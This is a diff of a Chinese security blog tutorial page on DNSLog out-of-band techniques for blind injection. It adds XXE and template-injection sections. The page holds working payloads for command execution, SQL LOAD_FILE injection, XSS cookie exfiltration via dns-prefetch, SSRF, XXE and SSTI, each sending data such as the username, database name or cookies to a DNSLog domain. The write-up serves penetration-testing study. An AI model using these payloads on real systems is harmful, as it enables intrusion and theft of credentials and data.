@@ -190,7 +190,7 @@
 </ul>
 <p>这里我们取得一个DNS域名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t6n089.ceye.io</span><br></pre></td></tr></table></figure>
-
+<br/>
 
 <h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>无回显得命令执行语句可以使用DNSLog来查看结果。</p>
 <ul>
@@ -204,6 +204,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113750098.png" alt="image-20210317113750098"></p>
 <p>都可以看到我们的用户名显示在域名的最左边</p>
+<br/>
+
 <h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先<code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%secure%&#x27;;</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| require_secure_transport | OFF   |</span><br><span class="line">| secure_auth              | ON    |</span><br><span class="line">| secure_file_priv         | NULL  |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span>, <span class="number">1</span> <span class="keyword">warning</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
 <ul>
@@ -230,6 +232,8 @@
 <p>在本地搭建了一个SQL注入的环境，在XP系统上似乎不行，原因未知，而在WIN10能够成功执行。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;db.php?id&#x3D;&#39; and (SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT database()),&#39;.t6n089.ceye.io\\abc&#39;)))--+</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317150746330.png" alt="image-20210317150746330"></p>
+<br/>
+
 <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>对于没有回显的XSS，我们要想知道是否成功也可以利用<code>src</code>属性填入得到的域名。</p>
 <p>example：</p>
 <p>payload:</p>
@@ -252,13 +256,27 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML%3D%22%3Clink%20rel%3D&#39;dns-prefetch&#39;%20href%3D&#39;http%3A%2F%2F%22%2Bdocument.cookie.split(%2F%3B%7C%3D%2F)%5B0%5D.trim()%2B%22.t6n089.ceye.io&#39;%3E%22%3B</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
 <p>这种利用方法十分苛刻，因为不仅要找到能够修改后台的外联JavaScript文件的方法，而且作为XSS攻击，此payload过长，容易被怀疑，而使用短链接加载外部脚本有会被CSP禁止，再加上根据DNS的规定，域名的长度是有限制的，有时可能不发将长cookie完全带出。</p>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>一个没有回显得SSRF场景，我们同样可以通过DNSLog知道是否存在漏洞</p>
+<br/>
+
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>一个没有回显的SSRF场景，我们同样可以通过DNSLog知道是否存在漏洞</p>
 <p>example:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?url&#x3D;http:&#x2F;&#x2F;ssrf.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317155356269.png" alt="image-20210317155356269"></p>
+<br/>
+
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>当我们遇到XXE，如果这个XXE漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;t6n089.ceye.io&quot;&gt;%remote;]&gt;</span><br><span class="line">&lt;root&gt;666&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>就可以通过DNS服务器来查看是否存在XXE漏洞。</p>
+<br/>
+
+<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>在模板注入碰到盲注的时候可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&quot;curl &#96;whoami&#96;.t6n089.ceye.io&quot;).read()&#x3D;&#x3D;&#39;ssti&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426201845448.png" alt="image-20210426201845448"></p>
+<br/>
+
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="http://www.0xby.com/916.html" >巧用DNSlog实现实现无回显注入<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/" >Bypassing Content-Security-Policy with DNS prefetching<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1402.html" >使用DNSLOG获取漏洞的回显<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1402.html" >使用DNSLOG获取漏洞的回显<i class="fas fa-external-link-alt"></i></a><a class="link"   target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1402.html" >https://www.redhatzone.com/ask/article/1402.html<i class="fas fa-external-link-alt"></i></a>)</p>
 
         </div>
 
@@ -433,7 +451,7 @@
         
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DNSLog-%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93"><span class="nav-text">DNSLog 盲注总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL"><span class="nav-text">SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="nav-text">绕过CSP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DNSLog-%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93"><span class="nav-text">DNSLog 盲注总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL"><span class="nav-text">SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="nav-text">绕过CSP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-text">模板注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
     </div>
 </div>
         
